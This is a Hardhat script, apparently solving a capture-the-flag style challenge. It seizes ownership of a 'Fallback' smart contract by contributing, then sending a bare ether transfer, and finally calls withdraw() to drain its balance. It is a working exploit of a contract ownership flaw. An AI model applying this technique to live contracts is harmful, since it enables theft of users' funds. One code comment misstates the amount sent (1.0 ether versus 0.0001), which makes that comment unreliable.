const hre = require("hardhat");

async function main() {
  const [owner] = await ethers.getSigners();
  const Fallback = await hre.ethers.getContractFactory("Fallback");
  // attach your instance address
  const fallback = Fallback.attach(
    "0x9Bd612774AEc33cB10a5e8555738556118Dc6a9E"
  );

  const currentOwner = await fallback.owner();
  console.log(`Current Owner is  ${currentOwner}`);
  await fallback.connect(owner).contribute({
    value: ethers.utils.parseEther("0.0001"),
  });

  console.log("Attacking");
  const tx = await owner.sendTransaction({
    to: fallback.address,
    value: ethers.utils.parseEther("0.0001"), // Sends exactly 1.0 ether
  });
  await tx.wait(1);
  const NewOwner = await fallback.owner();
  console.log(`New Owner is  ${NewOwner}`);

  await fallback.withdraw();
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
